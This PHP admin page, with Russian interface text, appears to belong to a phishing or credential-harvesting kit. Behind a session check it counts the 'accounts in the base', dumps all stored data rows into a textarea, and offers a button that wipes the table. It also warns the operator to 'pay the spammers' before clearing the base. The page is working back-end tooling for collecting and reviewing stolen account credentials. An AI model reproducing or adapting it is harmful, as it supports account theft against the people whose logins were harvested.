<?
include '../bdlog.php';

if(isset($_SESSION['admin'])) {
$msg = '';


if(isset($_GET['deluser'])) {
	
	$db->query("delete from data");
		$db->query("ALTER TABLE data AUTO_INCREMENT = 1");
	

	$msg = '<div class="callout callout-success">
                  <h5>Успех!</h5>

                  <p>Были удалены все пользователи.</p>
                </div>';
				
				// echo '<META HTTP-EQUIV="REFRESH" CONTENT="0;URL=../admin/index.php">';
}




} else { echo '<META HTTP-EQUIV="REFRESH" CONTENT="0;URL=auth.php">'; }
if(!isset($_SESSION['admin'])) { echo '<style> body {display:none !important;}'; }
$randch = rand(100,9999999999999999);
?>
<!DOCTYPE html>
<!--
This is a starter template page. Use this page to start your new project from
scratch. This page gets rid of all links and provides the needed markup only.
-->
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta http-equiv="x-ua-compatible" content="ie=edge">

  <title>Admin</title>

  <!-- Font Awesome Icons -->
  <link rel="stylesheet" href="plugins/font-awesome/css/font-awesome.min.css">
  <!-- Theme style -->
  <link rel="stylesheet" href="dist/css/adminlte.min.css">
  <!-- Google Font: Source Sans Pro -->
  <link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,400i,700" rel="stylesheet">
</head>
<body class="hold-transition sidebar-mini">
<div class="wrapper">

 
  <!-- /.navbar -->

  <!-- Main Sidebar Container -->
  <aside class="main-sidebar sidebar-dark-primary elevation-4">
    <!-- Brand Logo -->
    <a href="index.php" class="brand-link">
      <img src="dist/img/AdminLTELogo.png" alt="AdminLTE Logo" class="brand-image img-circle elevation-3"
           style="opacity: .8">
      <span class="brand-text font-weight-light">AdminPANEL</span>
    </a>

    <!-- Sidebar -->
    <div class="sidebar">
      <!-- Sidebar user panel (optional) -->
      

      <!-- Sidebar Menu -->
      <nav class="mt-2">
        <ul class="nav nav-pills nav-sidebar flex-column" data-widget="treeview" role="menu" data-accordion="false">
          <!-- Add icons to the links using the .nav-icon class
               with font-awesome or any other icon font library -->
          <? include 'menu.php'; ?>
          
        </ul>
      </nav>
      <!-- /.sidebar-menu -->
    </div>
    <!-- /.sidebar -->
  </aside>

  <!-- Content Wrapper. Contains page content -->
  <div class="content-wrapper">
    <!-- Content Header (Page header) -->
    <div class="content-header">
      <div class="container-fluid">
        <div class="row mb-2">
          <div class="col-sm-6">
            <h1 class="m-0 text-dark">Главная</h1>
          </div>
        </div><!-- /.row -->
      </div><!-- /.container-fluid -->
    </div>
    <!-- /.content-header -->

    <!-- Main content -->
    <div class="content">
      <div class="container-fluid">
        <div class="row">
          <div class="col-lg-3 col-6">
            <!-- small box -->
            <div class="callout callout-info">
              <div class="inner">
                <h3  style="font-size:20px;"><?=$colvousers?></h3>

                <p>Всего акков в базе</p>
              </div>
              <div class="icon">
                <i class="ion ion-bag"></i>
              </div>
             
            </div>
          </div>
          <!-- ./col -->
          
          <!-- ./col -->
          
		  <div class="col-lg-4 col-6">
            <!-- small box -->
            <div class="callout callout-info">
              <div class="inner">
                <h4 style="font-size:20px;">Очистить статистику</h4>

				<form method="GET" style=" display: inline-block; "><button type="submit" style="border:none" class="badge bg-danger"><input type="hidden" name="deluser" value="8">Очистить базу</button></form>
              </div>
              <div class="icon">
                <i class="ion ion-person-add"></i>
              </div>
             
            </div>
          </div>
          
        </div>
		<?=$msg?>
		<div class="col-md-12" style="display:inline-block;">
            
            <!-- /.card -->

            <div class="card">
              <div class="card-header">
                <h3 class="card-title">База</h3>
              </div>
			  <div class="callout callout-danger" style=" margin-left: 5px; margin-right: 10px; margin-top: 10px; ">
                  <p>Внимание! Перед очисткой базы, заплатите спамерам.</p>
                </div>
              <!-- /.card-header -->
              <div class="card-body p-0">
                <textarea readonly style="margin-top: 0px;margin-left: 10px;margin-bottom: 10px;height: 400px;width: 90%;">
<? if(isset($_SESSION['admin'])) {
	$linkads = $db->query("SELECT * FROM data order by id desc");			
while ($resone = mysqli_fetch_array($linkads)) {	
echo $resone['data'].'
';
				  } }
																				?>
</textarea>
              </div>
              <!-- /.card-body -->
            </div>
            <!-- /.card -->
          </div>
		 
		  
        <!-- /.row -->
      </div><!-- /.container-fluid -->
    </div>
    <!-- /.content -->
  </div>
  <!-- /.content-wrapper -->

  <!-- Control Sidebar -->
  
  <!-- /.control-sidebar -->

  <!-- Main Footer -->
 
</div>
<!-- ./wrapper -->

<!-- REQUIRED SCRIPTS -->

<!-- jQuery -->
<script src="plugins/jquery/jquery.min.js"></script>
<!-- Bootstrap 4 -->
<script src="plugins/bootstrap/js/bootstrap.bundle.min.js"></script>
<!-- AdminLTE App -->
<script src="dist/js/adminlte.min.js"></script>
</body>
</html>